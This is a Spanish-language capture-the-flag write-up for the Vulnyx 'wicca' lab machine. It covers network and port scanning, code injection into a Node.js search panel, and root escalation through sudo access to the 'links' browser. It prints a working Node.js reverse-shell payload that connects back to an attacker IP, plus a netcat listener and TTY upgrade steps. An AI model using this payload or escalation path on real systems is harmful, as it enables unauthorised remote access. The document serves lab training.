# Vulnyx-wicca

### Identificación de la IP en la red

```bash
# ARP scan
arp-scan -I eth0 --localnet
•(IP-victima)  08:00:27:fd:2a:fe       PCS Systemtechnik GmbH
```

### Escaneo de Puertos

```bash
# Nmap scan
nmap -p 22,80,5000 -sS -sC -sV  -n -Pn (IP-victima) -oN nmap
•22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
•80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
•5000/tcp open  http    Node.js (Express middleware)
```

Dentro del puerto 5000 encontramos un panel con un input de búsqueda vulnerable a XSS, pero al ejecutar una reverseshell mediante XSS, no podemos inyectar comandos. Investigaremos esta intrusión más tarde.

Otra manera de verificar la vulnerabilidad es modificar ciertos parámetros en la URL. En este caso, la URL genera un token en números "/?name=(input)&token=23123334". Si modificamos el token por otros números, no sucede nada, pero al cambiarlo por letras, la web parece romperse.

Al ver la vulnerabilidad en la web, procedemos a buscar en Google una forma de crear una reverseshell en React. Encontramos lo siguiente:

```javascript
(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(443, "(IP-atacante)", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();
```
Fuente (https://medium.com/dont-code-me-on-that/bunch-of-shells-nodejs-cdd6eb740f73)

Nos ponemos en escucha con Netcat:

```bash
nc -nlvp 443
```

Ya estamos dentro:

```bash
whoami
•aleister
```

Ahora hacemos el tratamiento de la TTY:

```bash
script /dev/null -c bash
control+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Ahora toca escalar privilegios hasta llegar a root:

```bash
sudo -l
•(root) NOPASSWD: /usr/bin/links
```

Vemos que tenemos "links" con ejecución como root.

Ejecutamos "/links" como root:

```bash
sudo /usr/bin/links 
```

Se abre una ventana donde podemos ejecutar algunos comandos. Al presionar "escape" vemos que se abre una barra tipo menú y en "files" encontramos una opción para generar una bash.

```bash
file
OS shell
```

Y ya tenemos una shell como root :D
